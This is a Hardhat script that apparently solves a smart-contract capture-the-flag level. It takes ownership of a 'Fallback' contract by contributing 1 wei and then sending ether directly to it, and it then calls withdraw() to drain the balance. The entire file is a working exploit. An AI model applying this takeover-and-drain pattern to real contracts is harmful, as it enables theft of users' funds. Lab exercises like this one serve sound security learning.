import { ethers } from "hardhat";

async function main() {

  const InstanceAddress = "0x424C6A6fe9E42A9481e2FAE9f25CCC1c0385987a";
  const fallback = await ethers.getContractAt("Fallback", InstanceAddress);
  const [deployer] = await ethers.getSigners();
 
  console.log(`Last owner is: ${await fallback.owner()}`);
  await fallback.contribute({value: 1});
  await deployer.sendTransaction({to:fallback.address, value:1});
  console.log(`New owner is: ${await fallback.owner()}`);
  await fallback.withdraw();
  const balanceAfter = await ethers.provider.getBalance(fallback.address);
  console.log(`Balance is ${balanceAfter}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

